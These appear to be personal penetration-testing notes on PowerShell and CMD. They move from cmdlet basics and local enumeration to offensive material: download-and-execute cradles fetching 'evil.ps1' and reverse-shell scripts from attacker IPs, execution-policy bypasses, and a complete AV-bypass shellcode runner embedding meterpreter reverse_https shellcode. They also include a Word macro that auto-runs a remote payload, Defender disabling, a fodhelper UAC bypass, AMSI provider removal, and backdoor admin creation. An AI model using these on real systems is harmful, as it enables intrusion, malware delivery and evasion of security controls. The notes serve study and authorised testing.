What is a Powershell?
	-> Powershell is the Windows Scripting Language and shell environment that is built using the .NET framework. 
	-> This also allows Powershell to execute .NET functions directly from its shell. Most Powershell commands, called cmdlets, are written in .NET. Unlike other scripting languages and shell environments, the output of these cmdlets are objects - making Powershell somewhat object oriented. 
	-> This also means that running cmdlets allows you to perform actions on the output object(which makes it convenient to pass output from one cmdlet to another).
	-> The normal format of a cmdlet is represented using Verb-Noun; for example the cmdlet to list commands is called Get-Command.
	-> Common verbs to use include:
		1. Get
		2. Start
		3. Stop
		4. Read
		5. Write
		6. New
		7. Out
	-> Link for approved verbs: https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7


Creating Objects From Previous cmdlets 
	-> One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet. 

Filtering objects
	-> When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties. 

	Format: Verb-Noun | Where-Object -Property PropertyName -operator Value
	Format: Verb-Noun | Where-Object {$_.PropertyName -operator Value}
		-> This version  uses the $_ operator to iterate through every object passed to the Where-Object cmdlet.

	Where -operator is a list of the following operators
		-Contains: if any item in the property value is an exact match for the specified value.
		-EQ: if the property value is the same as the specified value
		-GT: if the property value is greater than the specified value


Sorting Objects
	When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a cmdlet to the Sort-Object cmdlet.

	The format of the command would be: Verb-Noun | Sort-Object


Basic Powershell commands
	1. Get-Help [Command-Name]
		-Examples - use this switch to understand how exactly the command works.
		example: Get-Help Get-Command -Examples
		>Get-Help process - Lists everything containing "process"


	2. Get-Command [Verb-* or *-Noun] - Get-Command gets all the cmdlets installed on the current Computer. 
		example: Get-Command New-*
	
	3. Get-Command | Get-Member -MemberType Method - fetch members of Get-Command 
	
	4. Select-Object - One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. 
		-first - gets the first x object
		-last - gets the last x object
		-unique - shows the unique objects
		-skip - skips x objects	

		example: Get-ChildItem | Select-Object -Property Mode, Name

	5. Get-Service | Where-Object -Property Status -EQ Stopped
	6. Get-ChildItem | Sort-Object
	7. Get-Content [filename] - reads the contents of the file. Like 'type' command.
	8. some command | Measure-Object - measures count, average and so on of the objets from the output of a command.
	9. Get-FileHash -Algorithm [md5,sha512,....] [filename]
	10.Get-Location - prints working directory
	11.Get-ChildItem -Path [path] -Force -ErrorAction SilentlyContinue -Recurse 
	12.Invoke-WebRequest -Uri www.google.com - like curl command
	13.$env:UserName - same as whoami
	14.Enter-PSSession -ComputerName corp-adt01.corporate.local  -Credential corporate\DaviesJ - accessing internal machines from a powershell session

Enumeration using Powershell
	1. Get-LocalUser - lists all the local users
	2. Get-LocalUser | Where-Object -Property PasswordRequired -Match False - lists users which have passwords disabled.
	3. Get-LocalGroup - lists all the groups of the current user.
	4. Get-NetIPAddress - ipconfig /all
	5. Get-NetTCPConnection - lists tcp connections
	6. Get-WmiObject -Class win32_quickfixengineering - lists all the patches applied.
	7. Get-HotFix - lists patches
	8. ps - lists processes
		>Get-Process
	9. Get-ChildItem -Recurse | Select-String "API_KEY" -List - lists all files containing the pattern API_KEY 
	10. Get-ScheduledTask, Get-ScheduledJob - lists scheduled tasks and jobs.
	11. (Get-Acl <folder name>).Access | Format-Table IdentityReference,FileSystemRights,AccessControlType,IsInherited,InheritanceFlags -AutoSize
		-> This command will lists folder/file permissions.
	12.1..15 | %{echo "10.0.2.$_"; ping -n 1 10.0.2.$_ | Select-String ttl}
		-> This command will ping the hosts in the range given, and grep out the ttl part, if the host is up.
	13.1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("localhost", $_)) "Open port on - $_"} 2>$null
		-> This command will output all open ports and this command can be used on remote targets as well.

Manipulating files:
	1. Start-Process notepad.exe - This command can be used to start a process. Here it will open a notepad window.
	2. Get-Process - lists all running processes 
		-name: parameter to filter for a specific process name.
	3. Export-Csv - this command will create a csv file from the output of the previous command.
		Example: Get-Process | Export-Csv running_processes.csv 
	4. Get-Content [filename] - similar to cat on linux and type on win cmd.
	5. Copy-Item/Move-Item [source file] [destination file] - copy and move.
	6. Get-FileHash -Alogorithm MD5/SHA256/... [filename] - calculate hash of a file.
	7. Out-File [filename] - used to save the output to a file.

Downloading Files:
	1. (New-Object System.Net.WebClient).DownloadFile('infile','outfile')
	2. Invoke-WebRequest [link to file] -OutFile [file]
	3. echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #from cmd and execute
	4. iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
	5. $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate(http://<ipaddress>/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

	After Powershell v3:

	6. iex (iwr 'http://<ipaddr>/evil.ps1')
	7. $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://<ipaddr>/evil.ps1',$false);$h.send();iex $h.responseText
	8. $wr = [System.NET.WebRequest]::Create("<ipaddr>") $r = $wr.GetResponse() IEX  [System.IOStreamReader]($r.GetResponseStream())).ReadToEnd()

	9. powershell -c wget <ipaddr> -outfile <filename>
	10.powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://172.16.100.18/)
	11. powershell.exe -c (iwr http://172.16.100.18/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.18 -Port 25

	12. iex (iwr http://172.16.100.18:8181/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.18 -Port 25

	13. iex (iwr http://172.16.100.18:8181/PowerView.ps1 -UseBasicParsing)


	Note: Once the script has been downloaded, you may run into the first related to PowerShell: ExecutionPolicy. It is important to note that, as Microsoft clearly states in the related documentation, “ExecutionPolicy” is NOT a security feature. It merely functions as an added safety measure and can be bypassed by the user. 
		>Get-ExecutionPolicy -list

		->  Execution policies can have seven different values;
    		1. AllSigned: Scripts can run but require all scripts to be signed by a trusted publisher.
    		2. Bypass: All scripts can run, and no warnings or prompts will be displayed.
    		3. Default: This refers to “restricted” for Windows clients and “RemoteSigned” for Windows 			servers.
    		4. RemoteSigned: Scripts can run, and this does not require local scripts to be digitally signed.
    		5. Restricted: The default configuration for Windows clients. Allows individual commands to run, 	does not allow scripts.
    		6. Undefined: This shows that no specific execution policy was set. This means default execution 	policies will be enforced.
    		7. Unrestricted: Most scripts will run. 
    How to bypass execution policy?
    	1. powershell -ExecutionPolicy Bypass -File [script]
    	2. Set-ExecutionPolicy Bypass -Scope Process
    		-> The “-scope” parameter will set the execution policy only for the current PowerShell session and will go back to the initial settings once the PowerShell session is closed.
    	3. powershell -ep bypass
    	4. powershell -c <cmd>
    	5. - powershell -encodedcommand
    	6. - $env:PSExeuctionPolicyPreferernce="bypass"


Using Active Directory Module in Powershell:
	>Import-Module ActiveDirectory
	>Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster
	>Get-ADForest | Select-Object Domains
	>Get-ADTrust -Filter * | Select-Object Direction, Source, Target

Using PowerView.ps1:
	PowerView is one of the most effective ways to gather information about the domain. Remember that you may need to bypass the execution policy to be able to run the script.
	1. Import-Module .\powerview.ps1
	2. Get-DomainController - Collects information about the domain controller.
		-> Knowing the IP address of the domain controller will be useful to conduct MITM attacks and to focus our efforts on high-value targets.
	3. Get-NetUser - lists domain users and their properties.
		-> The output can be intimidating. You can use format-table to list only useful columns.
		Examples:
		Get-NetUser | Format-Table name,pwdlastset,lastlogon
		Get-NetUser | Out-GridView 
	4. Get-DomainComputer - useful to enumerate systems connected to the domain.
		-> -ping switch can also be used to see which systems are currently online in the domain.
	5. Get-NetGroup - enumerates existing groups in the domain.
		Note: Some accounts can be members of important groups, such as domain admins. Knowing which accounts have useful privileges or are a member of groups of interest will be useful for lateral movement and privilege escalation.
	6. Get-DomainGroupMember [Group Name] - enumerate members of the group
		example: Get-NetGroupMember "Domain Admins"
	7. Find-DomainShare - lists available shares.
		-CheckShareAccess - lists only readable shares.
	8. Get-NetGPO - will gather information on enforced policies.
		Note: Group Policy is used to configure computers connected to the domain. Spending some time understanding what policies are set can provide potential attack vectors (is Windows Defender disabled? Is the firewall disabled? Etc.) 
	9. Get-NetDomainTrust - will list any domain you may access.
		-> The domain you are testing can have a trust relationship with another domain. If this is the case, you may be able to extend the scope of the reconnaissance to that domain.
	10. -Domain - This parameter can be used with any command followed by the name of the other domain:
			Example: Get-NetUser -Domain infra.munn.local
	11. Find-LocalAdminAccess - will list systems in the domain you may have access as a local administrator.
		-> Knowing which systems the current user can access with local administrator privileges can facilitate lateral movement.
	12. Get-Domain: info about forest, dc's, and domain name are enumerated.
	13. Get-NetForest - Get-NetForest is similar to Get-ADForest, and provides similar output. It provides all the associated Domains, the root domain, as well as the Domain Controllers for the root domain.
	14. Get-NetDomainTrust - Get-NetDomainTrust is similar to Get-ADTrust with our SelectObject filter applied to it. It’s short, sweet and to the point!

	Source for more information: https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview

	

PowerShell AV Bypass Runner:
	Use the below code. Change the $buf variable to shellcode for -
		>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.44 LPORT=443 EXITFUNC=thread -f ps1
		```
		function LookupFunc {
		    Param ($moduleName, $functionName)
		    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
		    $tmp=@()
		    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
		    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
		    }
		    function getDelegateType {
		    Param (
		    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		    [Parameter(Position = 1)] [Type] $delType = [Void]
		    )
		    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
		    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
		    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
		    return $type.CreateType()
		    }
		    $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
		    [Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x51,0x56,0x48,0x8b,0x52,0x20,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x1,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x48,0x1,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xd,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,0x34,0x34,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xb0,0x0,0x0,0x0,0x2f,0x5a,0x31,0x6a,0x36,0x44,0x55,0x6c,0x6e,0x55,0x53,0x33,0x58,0x33,0x64,0x62,0x66,0x74,0x74,0x70,0x65,0x45,0x67,0x6e,0x67,0x4e,0x77,0x64,0x5a,0x41,0x62,0x30,0x32,0x47,0x38,0x6c,0x6e,0x35,0x34,0x39,0x79,0x6e,0x34,0x4a,0x6c,0x49,0x63,0x4e,0x45,0x73,0x75,0x30,0x62,0x65,0x5a,0x4e,0x63,0x4b,0x7a,0x50,0x4d,0x30,0x79,0x43,0x5a,0x6d,0x68,0x7a,0x38,0x4e,0x72,0x55,0x69,0x57,0x78,0x65,0x52,0x79,0x38,0x56,0x76,0x4f,0x70,0x6d,0x75,0x78,0x53,0x45,0x41,0x66,0x52,0x34,0x76,0x32,0x77,0x75,0x73,0x51,0x76,0x32,0x6d,0x5f,0x6d,0x61,0x61,0x6e,0x54,0x62,0x37,0x7a,0x78,0x6d,0x36,0x45,0x64,0x42,0x61,0x32,0x33,0x64,0x6e,0x63,0x53,0x4a,0x54,0x35,0x67,0x45,0x6d,0x59,0x75,0x41,0x42,0x6a,0x4a,0x79,0x49,0x41,0x78,0x56,0x5a,0x52,0x6a,0x45,0x6c,0x67,0x34,0x58,0x35,0x59,0x6e,0x55,0x50,0x63,0x57,0x30,0x59,0x54,0x58,0x49,0x64,0x77,0x56,0x68,0x32,0x73,0x68,0x68,0x4d,0x52,0x73,0x52,0x62,0x42,0x54,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5
		    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
		    $hThread =
		    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
		    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
		```
		Word Macro:
		```
		Sub ExcelConnect()
		    Dim str As String
		    str = "powershell iex (New-Object System.Net.WebClient).DownloadString('http://10.120.116.44:8080/runner.ps1') | IEX"
		    Shell str, vhHide
		End Sub

		Sub Document_Open()
		    ExcelConnect
		End Sub

		Sub AutoOpen()
		    ExcelConnect
		End Sub
		```

Amsi Bypass:
	refer joe helle notes: https://themayor.notion.site/53512dc072c241589fc45c577ccea2ee?v=7b908e7e76a9416f98f40d9d3843d3cb


Enumerates the Current Domain:
	$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
	$ADClass::GetCurrentDomain()

Disables Defender/Real Time Monitoring:
	>Set-MpPreference -DisableRealtimeMonitoring $true

Fodhelper UACBypass:
	New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
	New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
	fodhelper

	Nuke Amsi:
		>helper -custom "cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse"

	Add New User:
		>"cmd.exe /c net user test123 Password123! /add && net localgroup administrators test123 /add"

	Enable RDP:
		>"cmd.exe /c powershell reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"



Formatting Options:
	1. Format-Table Column1,Column2,...
	2. Format-List - can be used to gather more information/properties about an object.
		Examples: dir | Format-List
		-> If you want more properties to be displayed about an object, then use * after Format-List.
	3. findstr [string/column_name]
	4. Sort-Object
	5. Out-GridView - opens up a nice gui with sortable columns for any output.
	6. Select -ExpandProperty name - this cmdlet will display only the name property of the object.


Powershell Scripting:
	-> Variables are defined using $[variable]
	Format: $variable_name = value
	-> for loop syntax:
		foreach(condition){}
		Example: 
			foreach($port in $text_port){
				//Do something
			}
	-> If condition syntax:
		example: if($port -in $system_ports.LocalPort){
			echo $port
		}
	Powershell scripting resource: https://learnxinyminutes.com/docs/powershell/

Script Example
	1. Simple script to query for password in files:
		$path = "C:\Users\Administrator\Desktop\emails"
		$query_string = "password"
		$cmd = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $query_string
		echo $cmd


Powershell Useful Commands:
$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:5555/shell.ps1')" -Credential $cred
	-> shell.ps1 from InvokeReverseTcp (Nishang repo)

#run an executable from powershell:
Start-Process '<filename>'

To extract PS Credentials from a file:
	>$credential = Import-CliXml -Path [Path to ps cred file]
	>$credential.GetNetwork.Credential().Password

CMD useful commands:

	>where /R c:\windows [name of file]
	>dir /R - to see deeper contents

	Reading hidden data within files:
		> more < filename:hiddenfilename:$DATA

	Running powershell and then a custom script (PowerUp.ps1)
		>powershell -ep bypass
		>. .\PowerUp.ps1
		>Invoke-AllChecks

	If running "powershell -ep bypass" makes cmd freeze, then run:
		>powershell -ep bypass .\PowerUp.ps1 

	copy /y [file] [destination[filename]] -> to copy file to a destination.
	copy [file] //<remote-ip>/share -> copy a file to a remote share.

	Query service:
		>sc qc [service name]
		>sc query [service name]
		
	Look at directory or file permissions:
		>icacls [filename]

	Grant permissions using icacls
		>icacls [filename] /grant "machine-name\username":(F)

	Look at scheduled tasks
		>schtasks

	